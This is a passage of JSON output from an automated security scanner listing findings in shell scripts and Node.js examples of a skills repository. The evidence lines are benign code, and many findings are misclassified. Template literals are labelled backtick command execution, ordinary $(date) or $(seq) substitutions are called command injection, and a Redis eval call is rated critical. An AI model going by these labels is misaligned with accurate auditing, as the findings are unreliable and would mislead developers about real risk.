      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 251,
      "issue": "Command substitution in shell",
      "evidence": "local mean1=$(echo \"$results1\" | jq -r '.mean_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 252,
      "issue": "Command substitution in shell",
      "evidence": "local mean2=$(echo \"$results2\" | jq -r '.mean_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 254,
      "issue": "Command substitution in shell",
      "evidence": "local improvement=$(echo \"scale=2; (($mean1 - $mean2) / $mean1) * 100\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 255,
      "issue": "Command substitution in shell",
      "evidence": "local speedup=$(echo \"scale=2; $mean1 / $mean2\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 278,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$mean2 < $mean1\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 280,
      "issue": "Command substitution in shell",
      "evidence": "elif (( $(echo \"$mean2 > $mean1\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 294,
      "issue": "Privilege escalation",
      "evidence": "echo \"  Ubuntu/Debian: sudo apt-get install jq\" >&2",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 302,
      "issue": "Command substitution in shell",
      "evidence": "query1=$(cat \"$COMPARE_FILE1\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 303,
      "issue": "Command substitution in shell",
      "evidence": "query2=$(cat \"$COMPARE_FILE2\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 307,
      "issue": "Command substitution in shell",
      "evidence": "results=$(benchmark_query \"$QUERY\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 311,
      "issue": "Command substitution in shell",
      "evidence": "query=$(cat \"$QUERY_FILE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 312,
      "issue": "Command substitution in shell",
      "evidence": "results=$(benchmark_query \"$query\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 313,
      "issue": "Command substitution in shell",
      "evidence": "format_output \"$results\" \"$(basename \"$QUERY_FILE\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 88,
      "issue": "Command substitution in shell",
      "evidence": "for i in $(seq 1 \"$NODES\"); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 108,
      "issue": "Command substitution in shell",
      "evidence": "for i in $(seq 1 \"$NODES\"); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 109,
      "issue": "Unencrypted HTTP",
      "evidence": "initial_cluster=\"${initial_cluster}etcd-node$i=http://etcd-node$i:2380,\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 114,
      "issue": "Command substitution in shell",
      "evidence": "for i in $(seq 1 \"$NODES\"); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 120,
      "issue": "Command substitution in shell",
      "evidence": "-p \"$((2378 + i)):2379\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 121,
      "issue": "Command substitution in shell",
      "evidence": "-p \"$((2478 + i)):2380\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 125,
      "issue": "Unencrypted HTTP",
      "evidence": "--initial-advertise-peer-urls \"http://etcd-node$i:2380\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 126,
      "issue": "Unencrypted HTTP",
      "evidence": "--listen-peer-urls \"http://0.0.0.0:2380\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 127,
      "issue": "Unencrypted HTTP",
      "evidence": "--listen-client-urls \"http://0.0.0.0:2379\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 128,
      "issue": "Unencrypted HTTP",
      "evidence": "--advertise-client-urls \"http://etcd-node$i:2379\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 141,
      "issue": "Command substitution in shell",
      "evidence": "for attempt in $(seq 1 30); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 163,
      "issue": "Command substitution in shell",
      "evidence": "local value=$(docker exec etcd-node1 etcdctl get test-key --print-value-only)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 173,
      "issue": "Command substitution in shell",
      "evidence": "local value2=$(docker exec etcd-node2 etcdctl get test-key --print-value-only)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 183,
      "issue": "Command substitution in shell",
      "evidence": "local lease_id=$(docker exec etcd-node1 etcdctl lease grant 10 | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 185,
      "issue": "Command substitution in shell",
      "evidence": "local temp_value=$(docker exec etcd-node1 etcdctl get temp-key --print-value-only)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 206,
      "issue": "Command substitution in shell",
      "evidence": "local counter=$(docker exec etcd-node1 etcdctl get counter --print-value-only)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 219,
      "issue": "Command substitution in shell",
      "evidence": "for i in $(seq 1 \"$NODES\"); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 220,
      "issue": "Command substitution in shell",
      "evidence": "local status=$(docker exec \"etcd-node$i\" etcdctl endpoint status --cluster -w json 2>/dev/null || echo \"[]\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 223,
      "issue": "Command substitution in shell",
      "evidence": "local is_leader=$(echo \"$status\" | jq -r \".[0].Status.leader == .[0].Status.header.member_id\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 232,
      "issue": "Command substitution in shell",
      "evidence": "\"endpoint\": \"http://localhost:$((2378 + i))\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 248,
      "issue": "Command substitution in shell",
      "evidence": "$(IFS=,; echo \"${nodes_status[*]}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 265,
      "issue": "Command substitution in shell",
      "evidence": "for i in $(seq 1 \"$NODES\"); do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
      "line_number": 266,
      "issue": "Command substitution in shell",
      "evidence": "log_info \"  Node $i: http://localhost:$((2378 + i))\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 125,
      "issue": "Command substitution in shell",
      "evidence": "count=$((count + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 126,
      "issue": "Command substitution in shell",
      "evidence": "local basename=$(basename \"$workflow\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 129,
      "issue": "Command substitution in shell",
      "evidence": "local name=$(grep -E \"^name:\" \"$workflow\" | head -1 | sed 's/name: *//' | tr -d '\"' | tr -d \"'\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 139,
      "issue": "Command substitution in shell",
      "evidence": "local triggers=$(awk '/^on:/{flag=1;next}/^[a-zA-Z]/{flag=0}flag' \"$workflow\" | grep -v \"^$\" | sed 's/^  //' | tr '\\n' ', ' | sed 's/, $//')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 145,
      "issue": "Command substitution in shell",
      "evidence": "local job_count=$(grep -E \"^  [a-z][a-z_-]+:\" \"$workflow\" | wc -l | tr -d ' ')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 195,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 197,
      "issue": "Command substitution in shell",
      "evidence": "echo -e \"${BLUE}Testing workflow: $(basename \"$workflow_path\")${NC}\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 240,
      "issue": "Command substitution in shell",
      "evidence": "local output_file=$(mktemp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 248,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 249,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$((end_time - start_time))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "local job_count=$(grep -c \"Job succeeded\" \"$output_file\" || echo \"0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 259,
      "issue": "Command substitution in shell",
      "evidence": "local failed_jobs=$(grep -c \"Job failed\" \"$output_file\" || echo \"0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 294,
      "issue": "Command substitution in shell",
      "evidence": "local workflow_name=$(basename \"$workflow_path\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 307,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
      "line_number": 389,
      "issue": "Command substitution in shell",
      "evidence": "if ! workflow_path=$(validate_workflow \"$WORKFLOW\"); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 36,
      "issue": "Command substitution in shell",
      "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 50,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 53,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost --concurrency 100 --threads 4",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 56,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost --duration 30 --json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 59,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost --test-workers",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 62,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost --test-cache",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 140,
      "issue": "Command substitution in shell",
      "evidence": "wrk_output=$(wrk -t\"$threads\" -c\"$connections\" -d\"${duration}s\" --latency \"$url\" 2>&1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 154,
      "issue": "Command substitution in shell",
      "evidence": "requests_per_sec=$(echo \"$wrk_output\" | grep \"Requests/sec:\" | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 155,
      "issue": "Command substitution in shell",
      "evidence": "total_requests=$(echo \"$wrk_output\" | grep \"requests in\" | awk '{print $1}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 156,
      "issue": "Command substitution in shell",
      "evidence": "total_data=$(echo \"$wrk_output\" | grep \"requests in\" | awk '{print $5}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 157,
      "issue": "Command substitution in shell",
      "evidence": "avg_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 158,
      "issue": "Command substitution in shell",
      "evidence": "max_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $4}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 159,
      "issue": "Command substitution in shell",
      "evidence": "stdev_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $3}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 162,
      "issue": "Command substitution in shell",
      "evidence": "latency_50=$(echo \"$wrk_output\" | grep \"50.000%\" | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 163,
      "issue": "Command substitution in shell",
      "evidence": "latency_75=$(echo \"$wrk_output\" | grep \"75.000%\" | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 164,
      "issue": "Command substitution in shell",
      "evidence": "latency_90=$(echo \"$wrk_output\" | grep \"90.000%\" | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 165,
      "issue": "Command substitution in shell",
      "evidence": "latency_99=$(echo \"$wrk_output\" | grep \"99.000%\" | awk '{print $2}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 230,
      "issue": "Command substitution in shell",
      "evidence": "rps=$(cat /tmp/wrk_rps.tmp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 256,
      "issue": "Command substitution in shell",
      "evidence": "miss_rps=$(cat /tmp/wrk_rps.tmp 2>/dev/null || echo \"0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 264,
      "issue": "Command substitution in shell",
      "evidence": "hit_rps=$(cat /tmp/wrk_rps.tmp 2>/dev/null || echo \"0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 274,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$hit_rps > $miss_rps\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 276,
      "issue": "Command substitution in shell",
      "evidence": "improvement=$(echo \"scale=2; (($hit_rps - $miss_rps) / $miss_rps) * 100\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 319,
      "issue": "Command substitution in shell",
      "evidence": "rps=$(cat /tmp/wrk_rps.tmp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 321,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$rps < 100\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
      "line_number": 327,
      "issue": "Command substitution in shell",
      "evidence": "elif (( $(echo \"$rps < 1000\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "CRITICAL",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 30,
      "issue": "eval() usage",
      "evidence": "redisClient.eval(script, numKeys, ...args, (err, result) => {",
      "recommendation": "Never use eval() with user input"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 92,
      "issue": "Backtick command execution",
      "evidence": "`rate_limit:${key}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 133,
      "issue": "Backtick command execution",
      "evidence": "return `api_key:${apiKey}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 138,
      "issue": "Backtick command execution",
      "evidence": "return `user:${req.user.id}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 143,
      "issue": "Backtick command execution",
      "evidence": "return `ip:${ip}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 179,
      "issue": "Backtick command execution",
      "evidence": "message: `Too many requests. Please retry after ${retryAfter} seconds.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
      "line_number": 216,
      "issue": "Backtick command execution",
      "evidence": "keyGenerator: (req) => `user:${req.user?.id || 'anonymous'}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 31,
      "issue": "Backtick command execution",
      "evidence": "req.id = `req-${Date.now()}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 187,
      "issue": "Backtick command execution",
      "evidence": "const baseUrl = `${req.protocol}://${req.get('host')}${req.path}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 188,
      "issue": "Backtick command execution",
      "evidence": "let queryParams = `limit=${limit}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 189,
      "issue": "Backtick command execution",
      "evidence": "if (status) queryParams += `&status=${status}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 190,
      "issue": "Backtick command execution",
      "evidence": "if (role) queryParams += `&role=${role}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 191,
      "issue": "Backtick command execution",
      "evidence": "if (sort) queryParams += `&sort=${sort}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 194,
      "issue": "Backtick command execution",
      "evidence": "self: `${baseUrl}?${queryParams}&offset=${offset}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 195,
      "issue": "Backtick command execution",
      "evidence": "first: `${baseUrl}?${queryParams}&offset=0`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 196,
      "issue": "Backtick command execution",
      "evidence": "last: `${baseUrl}?${queryParams}&offset=${Math.max(0, total - limit)}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 200,
      "issue": "Backtick command execution",
      "evidence": "links.prev = `${baseUrl}?${queryParams}&offset=${Math.max(0, offset - limit)}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
